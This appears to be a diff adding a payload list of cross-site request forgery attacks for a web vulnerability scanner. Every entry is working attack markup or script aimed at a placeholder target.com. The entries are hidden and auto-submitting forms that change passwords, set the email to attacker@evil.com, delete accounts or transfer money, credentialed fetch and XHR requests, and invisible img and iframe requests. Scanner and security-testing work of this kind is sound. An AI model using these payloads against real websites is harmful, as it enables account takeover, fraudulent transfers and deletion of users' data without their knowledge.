@@ -1,0 +1,60 @@
+# CSRF Payloads for Web Vulnerability Scanner
+# Basic HTML forms
+<form action="https://target.com/change_password" method="POST">
+  <input type="hidden" name="new_password" value="hacked">
+  <input type="hidden" name="confirm_password" value="hacked">
+  <input type="submit" value="Click me">
+</form>
+
+<form action="https://target.com/transfer" method="POST">
+  <input type="hidden" name="recipient" value="attacker">
+  <input type="hidden" name="amount" value="1000">
+  <input type="submit" value="Claim prize">
+</form>
+
+# Auto-submitting forms
+<form id="csrf-form" action="https://target.com/api/update_profile" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="csrf_token" value="">
+</form>
+<script>document.getElementById("csrf-form").submit();</script>
+
+<form id="csrf-form" action="https://target.com/api/delete_account" method="POST">
+</form>
+<script>document.getElementById("csrf-form").submit();</script>
+
+# XHR/Fetch based CSRF
+<script>
+fetch('https://target.com/api/update_settings', {
+  method: 'POST',
+  credentials: 'include',
+  body: JSON.stringify({
+    setting1: 'value1',
+    setting2: 'value2'
+  }),
+  headers: {
+    'Content-Type': 'application/json'
+  }
+});
+</script>
+
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://target.com/api/update_email', true);
+xhr.withCredentials = true;
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('email=attacker@evil.com');
+</script>
+
+# GET-based CSRF
+<img src="https://target.com/api/delete?id=123" width="0" height="0" border="0">
+
+<script>
+var i = new Image();
+i.src = "https://target.com/api/reset_password?user=victim";
+</script>
+
+# Iframe based CSRF
+<iframe src="https://target.com/delete_account" style="display:none"></iframe>
+
+<iframe src="https://target.com/api/transfer?to=attacker&amount=1000" width="0" height="0" border="0"></iframe>
